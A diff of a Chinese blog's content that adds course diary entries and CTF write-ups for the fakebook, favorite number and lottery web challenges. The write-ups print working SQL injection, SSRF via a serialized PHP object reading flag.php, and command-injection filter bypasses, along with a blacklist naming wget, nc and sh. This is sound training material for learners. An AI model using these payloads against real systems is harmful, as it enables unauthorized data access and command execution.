@@ -2357,6 +2357,18 @@
 <p>下午主要看了在B站直播的立创EDA，这是一个设计PCB板的平台，可以去自主设计也可以和别人去交流技术。</p>
 <h2 id="7-15-星期四"><a href="#7-15-星期四" class="headerlink" title="7.15 星期四"></a>7.15 星期四</h2><p>上午实训中期验收，感觉不妙</p>
 <p>下午自习，看PCB板视频还有资料里面的源码</p>
+<h2 id="9-6-星期一"><a href="#9-6-星期一" class="headerlink" title="9.6 星期一"></a>9.6 星期一</h2><p>今天是小学期下上课的第一天。</p>
+<p>上午听讲座，学习 BSP 说明中显示模块函数库 Displayer.lib ，并编写流水灯测试</p>
+<p>下午学习 BSP 说明中按键模块 函数库 Key.lib、无源蜂鸣 器函数库 Beep.lib 、音乐模块 函数库 Music.lib </p>
+<h2 id="9-7-星期二"><a href="#9-7-星期二" class="headerlink" title="9.7 星期二"></a>9.7 星期二</h2><p>上午学习了霍尔传感器模 块函数库 Hall.lib 、振动传感器模 块函数库 Vib.lib 、步进电机控制 模块函数库 StepMotor.lib </p>
+<p>下午学习模数转换模块 函数库 ADC.lib</p>
+<h2 id="9-8-星期三"><a href="#9-8-星期三" class="headerlink" title="9.8 星期三"></a>9.8 星期三</h2><p>开始设想自己的创新大作业选题</p>
+<p>上午学习异步通信模块 函数库 Uart1.lib </p>
+<p>下午学习EXT 模块函数 库（电子秤、超声波测距、编码器、 PWM）EXT.lib </p>
+<h2 id="9-9-星期四"><a href="#9-9-星期四" class="headerlink" title="9.9 星期四"></a>9.9 星期四</h2><p>学习 BSP 说明中红外模块函 数库 IR.lib、实时时钟模 块函数库 DS1302.lib</p>
+<p>因为选题重复，需要再加以修改</p>
+<h2 id="9-10-星期五"><a href="#9-10-星期五" class="headerlink" title="9.10 星期五"></a>9.10 星期五</h2><p>学习 BSP 说明中非易失性存 储器模块函数库M24C02.lib、非易失性存 储器模块函数库M24C02.lib</p>
+<p>最终选题定为霍尔元件测速。</p>
 ]]></content>
       <categories>
         <category>Others</category>
@@ -2478,7 +2490,7 @@
 <p>判断其字段数：<code>&#39; and 1=0 union select 1,2,3#</code>。成功回显</p>
 <p>判断当前数据库名以及版本：<code>&#39; and 1=0 union select 1,database(),version()#</code>。</p>
 <p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816080824462.png" alt="image-20210816080824462"></p>
-<p>获得所有的表名：<code>111&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#</code></p>
+<p>获得所有的数据库名：<code>111&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#</code></p>
 <p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816081723926.png" alt="image-20210816081723926"></p>
 <p>查询<code>news</code>数据库中的表信息：<code>111&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
 <p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082336320.png" alt="image-20210816082336320"></p>
@@ -2669,6 +2681,82 @@ php反序列化漏洞。
 <p>先把变量命名给改了，然后逆向解密</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function decode($miwen)&#123;</span><br><span class="line">   $mingwen&#x3D;&#39;&#39;;</span><br><span class="line">   $miwen&#x3D;base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">   $strrev&#x3D;strrev($miwen);</span><br><span class="line">   for ($i&#x3D;0; $i &lt; strlen($strrev); $i++) &#123; </span><br><span class="line">       </span><br><span class="line">   	    $char&#x3D;substr($strrev,$i,1);  </span><br><span class="line">        $ordchar&#x3D;ord($char)-1;  </span><br><span class="line">        $char&#x3D;chr($ordchar);  </span><br><span class="line">        $mingwen&#x3D;$mingwen.$char;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   return $mingwen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$miwen&#x3D;&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;</span><br><span class="line">echo decode($miwen);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+
+
+<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p><code>dirb</code>扫描结果（或者<code>nikto</code>等别的扫描工具）</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013190942893.png" alt="image-20211013190942893"></p>
+<p>可以知道flag.php就是我们要得到的</p>
+<p>访问<code>/robots.txt</code>发现<code>user.php.bak</code>源码泄露</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道两点：</p>
+<ol>
+<li>这道题有可能和反序列化有关</li>
+<li>get函数的<a href="https://blog.csdn.net/Fly_hps/article/details/83046613">Curl 导致 SSRF 及 WAF 绕过方式</a></li>
+</ol>
+<p>我们进入页面，注册账号，发现usename可以点，跳转到如下界面</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013224122689.png" alt="image-20211013224122689"></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013224156936.png" alt="image-20211013224156936"></p>
+<p><code>?no=1</code>有可能是sql注入，尝试注入。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231448634.png" alt="image-20211013231448634"></p>
+<p>首先回显2，在username下面，说明成功；</p>
+<p>同时我们看到，还有<code>unserialize</code>函数失败，同时<code>age</code>、<code>blog</code>和<code>the cotents of blog</code>都报错没有对象，联系到之前的源码，这三个内容都是由一个序列化的对象反序列化得到的。</p>
+<p>接下来我们查看数据库：</p>
+<ol>
+<li><code>?no=0 union/**/select 1,version(),3,4--</code>，查看数据库版本<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231807004.png" alt="image-20211013231807004"></li>
+<li><code>?no=0 union/**/select 1,database(),3,4--</code>，查看数据库名字<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231953403.png" alt="image-20211013231953403"></li>
+<li><code>?no=0 union/**/select 1,(select group_concat(schema_name) from information_schema.schemata),3,4--</code>，查看所有的数据库表名<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013232707915.png" alt="image-20211013232707915"></li>
+<li><code>?no=0 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4--</code>，查看<code>fakebook</code>数据库的表名<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013233244724.png" alt="image-20211013233244724"></li>
+<li><code>?no=0 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3,4--</code>，查看users字段名<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013233901324.png" alt="image-20211013233901324"></li>
+<li><code>?no=0 union/**/select 1,(select group_concat(no,username,passwd,data) from fakebook.users),3,4--</code>，查看字段名的值<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013234108197.png" alt="image-20211013234108197"></li>
+</ol>
+<p>看到data字段储存的是序列化的对象，我们现在回到之前的思路：将data字段的值设置成一个序列化的对象，然后得到内容。</p>
+<p>因为curl在权限够的情况下，可以通过file协议读取本地文件，所以payload如下：</p>
+<p><code>?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211014154306572.png" alt="image-20211014154306572"></p>
+<p>如果直接在注册的时候将blog注册为flag.php，不能通过isValidBlog ()函数的检测</p>
+<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><h3 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite number"></a>favorite number</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php5.5.9</span></span><br><span class="line"><span class="variable">$stuff</span> = <span class="variable">$_POST</span>[<span class="string">&quot;stuff&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$stuff</span> === <span class="variable">$array</span> &amp;&amp; <span class="variable">$stuff</span>[<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$num</span>= <span class="variable">$_POST</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\d+$/im&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;my favorite num is:&quot;</span>;</span><br><span class="line">            system(<span class="string">&quot;echo &quot;</span>.<span class="variable">$num</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Bonjour!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先是POST传入，然后我们需要绕过这几个点，system执行命令：</p>
+<ol>
+<li><p><code>$stuff === $array &amp;&amp; $stuff[0] != &#39;admin&#39;</code>也就是说<code>stuff[0]</code>要同时等于和不等于<code>admin</code>，其实这一步就是最难的<br>我们可以看到，在php 5.5.9版本存在的这个漏洞，所以stuff如下：<br><code>stuff[4294967296]=admin&amp;stuff[1]=user</code></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015155414421.png" alt="image-20211015155414421"><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015155801077.png" alt="image-20211015155801077"></p>
+</li>
+<li><p><code>preg_match(&quot;/^\d+$/im&quot;,$num)</code>，表示<code>num</code>是要由纯数字组成的字符串，但是我们要让<code>num</code>是一个命令，关键在于<code>/m</code>模式，所以我们要通过<code>%0a</code>换行绕过它，我们的payload更新如下:<br><code>stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=1%0als</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162001426.png" alt="image-20211015162001426"></p>
+</li>
+<li><p><code>!preg_match(&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#39;|\&quot;|\|/i&quot;,$num</code>，我们的命令要避开这些字符，然后还要得到flag，可以看到flag都被过滤了，这里有两个思路：</p>
+<ol>
+<li><p>command：tac `find -inum xxxx`<br>用inode索引节点，先找到flag文件的inode，然后用tac读取find找到的flag文件得到flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162230878.png" alt="image-20211015162230878"></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162534293.png" alt="image-20211015162534293"></p>
+</li>
+<li><p>command: printf /fla &gt; /tmp/target; printf g &gt;&gt; /tmp/target ; tac `tac /tmp/target`<br>思路是tac读取/tmp/target文件保存的<code>/flag</code>，得到flag。<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015165226482.png" alt="image-20211015165226482"></p>
+</li>
+<li><p>command: tac /fla$1g<br>思路是$1变量为空，所以最后还是执行<code>tac /flag</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170613255.png" alt="image-20211015170613255"><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170628858.png" alt="image-20211015170628858"></p>
+</li>
+<li><p>command: a=fla;b=g; tac /$a$b<br>拼接变量，执行<code>tac /flag</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170942675.png" alt="image-20211015170942675"></p>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>   进去看到home是个卖彩票的页面，全对奖励50000。buy是购买彩票的界面，还要注册一个用户名不要密码。account显示钱包和名字。</p>
+<p>   最后一个claim your price界面，如果我们有99990000的钱就可以购买flag。</p>
+<p>   <img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211016001448571.png" alt="image-20211016001448571"></p>
+<p>   现在我们想要通过买彩票去刷钱，发现都是随机数，挣不到钱。</p>
+<p>   dirb扫描结果：</p>
+<p>   <img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211016001734639.png" alt="image-20211016001734639"></p>
+<p>   发现.git泄漏，robots.txt也证明是.git泄漏。</p>
+<p>   用<code>githacker --url http://111.200.241.244:52967/ --folder result</code>得到源码</p>
+<p>   Seay打开审计代码，我们目的是知道怎么去刷钱，所以去看buy.php</p>
+   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php include(&#39;check_register.php&#39;);include(&#39;header.php&#39;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Buy a lottery!&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;numbers&quot; id&#x3D;&quot;numbers&quot; minlength&#x3D;&quot;7&quot; maxlength&#x3D;&quot;7&quot; pattern&#x3D;&quot;\d&#123;7&#125;&quot; required placeholder&#x3D;&quot;7 numbers&quot;&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;button&quot; id&#x3D;&quot;btnBuy&quot;&gt;Buy!&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;buy.js&quot;&gt;&lt;&#x2F;script&gt;   &#x2F;&#x2F;js&#x2F;buy.js</span><br><span class="line">&lt;p id&#x3D;&quot;wait&quot; class&#x3D;&quot;alert alert-info&quot; style&#x3D;&quot;display: none;&quot;&gt;Please wait...&lt;&#x2F;p&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;result&quot; style&#x3D;&quot;display: none;&quot;&gt;</span><br><span class="line">	&lt;p id&#x3D;&quot;info&quot; class&#x3D;&quot;alert alert-info&quot;&gt;Prize: &lt;span id&#x3D;&quot;prize&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;span style&#x3D;&quot;width: 10em; display: inline-block;&quot;&gt;Winning numbers:&lt;&#x2F;span&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;win&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;span style&#x3D;&quot;width: 10em; display: inline-block;&quot;&gt;Your numbers:&lt;&#x2F;span&gt;</span><br><span class="line">		&lt;div id&#x3D;&quot;user&quot;&gt;</span><br><span class="line">			&lt;span class&#x3D;&quot;number-ball number-ball-red&quot;&gt;1&lt;&#x2F;span&gt;</span><br><span class="line">			&lt;span class&#x3D;&quot;number-ball number-ball-gray&quot;&gt;6&lt;&#x2F;span&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include(&#39;footer.php&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>   追踪到<code>js/buy.js</code></p>
+   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#wait&#x27;</span>).show();</span><br><span class="line">	$(<span class="string">&#x27;#result&#x27;</span>).hide();</span><br><span class="line">	<span class="keyword">var</span> input = $(<span class="string">&#x27;#numbers&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">if</span>(input.validity.valid)&#123;</span><br><span class="line">		<span class="keyword">var</span> numbers = input.value;</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">		  method: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">		  url: <span class="string">&quot;api.php&quot;</span>,                                            <span class="comment">//api.php</span></span><br><span class="line">		  dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">		  contentType: <span class="string">&quot;application/json&quot;</span>, </span><br><span class="line">		  data: <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">action</span>: <span class="string">&quot;buy&quot;</span>, <span class="attr">numbers</span>: numbers &#125;)</span><br><span class="line">		&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(resp.status == <span class="string">&#x27;ok&#x27;</span>)&#123;</span><br><span class="line">				show_result(resp);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				alert(resp.msg);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		alert(<span class="string">&#x27;invalid&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$(<span class="string">&#x27;#wait&#x27;</span>).hide();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#prize&#x27;</span>).text(resp.prize);</span><br><span class="line">	<span class="keyword">var</span> numbers = resp.numbers;</span><br><span class="line">	<span class="keyword">var</span> win_numbers = resp.win_numbers;</span><br><span class="line">	<span class="keyword">var</span> numbers_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">var</span> win_numbers_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">		win_numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-red&quot;&gt;&#x27;</span> + win_numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(numbers[i] == win_numbers[i])&#123;</span><br><span class="line">			numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-red&quot;&gt;&#x27;</span> + numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-gray&quot;&gt;&#x27;</span> + numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$(<span class="string">&#x27;#win&#x27;</span>).html(win_numbers_result);</span><br><span class="line">	$(<span class="string">&#x27;#user&#x27;</span>).html(numbers_result);</span><br><span class="line">	$(<span class="string">&#x27;#money&#x27;</span>).text(resp.money);</span><br><span class="line">	$(<span class="string">&#x27;#result&#x27;</span>).show();</span><br><span class="line">	$(<span class="string">&#x27;#numbers&#x27;</span>).select()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#btnBuy&#x27;</span>).click(buy);	</span><br><span class="line">	$(<span class="string">&#x27;form&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">	  buy();</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>   看到数据发送到<code>api.php</code>，下面是部分源码，关键函数是buy函数：<br>   <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// my boss told me to use cryptographically secure algorithm </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$byte</span> = openssl_random_pseudo_bytes(<span class="number">10</span>, <span class="variable">$cstrong</span>);</span><br><span class="line">		<span class="variable">$num</span> = ord(<span class="variable">$byte</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$num</span> &gt;= <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$cstrong</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;server need be checked, tell admin&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$num</span> /= <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">return</span> strval(floor(<span class="variable">$num</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$result</span> .= random_num();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();                        <span class="comment">//得到</span></span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;                <span class="comment">//php弱类型比较</span></span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;                                   <span class="comment">//猜对的数字</span></span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
